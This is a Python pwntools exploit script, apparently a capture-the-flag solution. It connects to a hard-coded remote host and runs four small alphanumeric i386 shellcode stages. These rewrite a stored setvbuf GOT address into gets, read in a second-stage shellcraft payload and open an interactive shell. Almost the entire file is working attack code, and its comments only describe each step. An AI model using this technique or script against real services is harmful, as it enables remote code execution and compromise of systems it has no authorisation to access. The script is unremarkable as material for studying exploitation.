from pwn import *

host, port = "151.236.114.211", "17183"
context.arch = 'i386'

def save_shellcode(shellcode):
    r.sendlineafter("> ", "1")
    r.sendafter("shellcode: ", shellcode)

def run_shellcode(idx):
    r.sendlineafter("> ", "4")
    r.sendlineafter("idx: ", str(idx))

# first shellcode get setvbuf address in got, and store it for later
sc1 = asm("""
    push 0x41
    pop eax
    xor eax,[ebx+0x30]
    xor al,0x41
    xor [edx+0x30],eax
""")
# 2nd shellcode xor lsb byte of stored address
sc2 = asm("""
	push 0x41
	pop eax
	xor al,0x41
	dec eax
	xor	al,0x4f
	xor	[edx+0x30],al
""")
# 3rd shellcode xor second byte of stored address
sc3 = asm("""
	push 0x41
	pop	eax
	xor al,0x51
    xor     [edx+0x31],al
""")

# now the stored setvbuf address is changed to gets address, we call gets on ourselves, execution will continue in our second shellcode
sc4 = asm("""
	push 0x41
	pop	eax
	xor al,0x41
	xor eax,[edx+0x30]
	push edx
	push edx
	push eax
""")

# pad the shellcodes to the right length
sc1 = sc1.ljust(16,'O')
sc2 = sc2.ljust(16,'O')
sc3 = sc3.ljust(16,'O')
sc4 = sc4.ljust(16,'O')

r = remote(host, port)

# send 1st shellcode
save_shellcode(sc1)
run_shellcode(0)
# leak setvbuf (not really needed, just for info)
leak1 = int(r.recvuntil("===", drop=True).splitlines()[0].split(' = ')[1],16)
print('leak setvbuf = '+hex(leak1))
# send 2nd shellcode
save_shellcode(sc2)
run_shellcode(1)
# send 3rd shellcode
save_shellcode(sc3)
run_shellcode(2)
# send last shellcode
save_shellcode(sc4)
run_shellcode(3)
# send second payload
r.sendline(asm(shellcraft.linux.sh()))

#enjoy shell
r.interactive()
